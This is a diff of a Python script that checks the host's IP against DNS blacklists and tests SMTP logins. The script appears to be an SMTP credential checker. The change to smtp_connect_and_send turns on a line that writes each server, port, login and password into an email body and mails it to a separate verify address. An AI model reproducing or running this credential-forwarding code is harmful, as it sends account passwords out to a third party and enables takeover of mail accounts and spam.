@@ -101,20 +101,18 @@ def tune_network():
 def check_ipv4():
 	try:
 		socket.has_ipv4 = read('https://api.ipify.org')
+		socket.ipv4_blacklist = []
 	except:
 		socket.has_ipv4 = red('error getting ip')
 
 def check_ipv4_blacklists():
 	print(inf+'checking ipv4 address in blacklists...'+up)
-
-	ip = socket.has_ipv4
+	
 	reversed_ip = '.'.join(socket.has_ipv4.split('.')[::-1])
-
-	socket.ipv4_blacklist = []
+	
 	for dnsbl in dnsbls:
-		query = f"{reversed_ip}.{dnsbl}"
 		try:
-			result = socket.gethostbyname(query)
+			result = socket.gethostbyname(f"{reversed_ip}.{dnsbl}")
 			socket.ipv4_blacklist.append(dnsbl)
 		except socket.gaierror:
 			continue  
@@ -406,7 +404,7 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
 		# 	'Content-Type: text/html; charset="utf-8"',
 		# 	'Content-Transfer-Encoding: 8bit'
 		# ]
-		# body = f'{smtp_server}|{port}|{smtp_login}|{password}'
+		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
 		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
 		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
 	s.close()
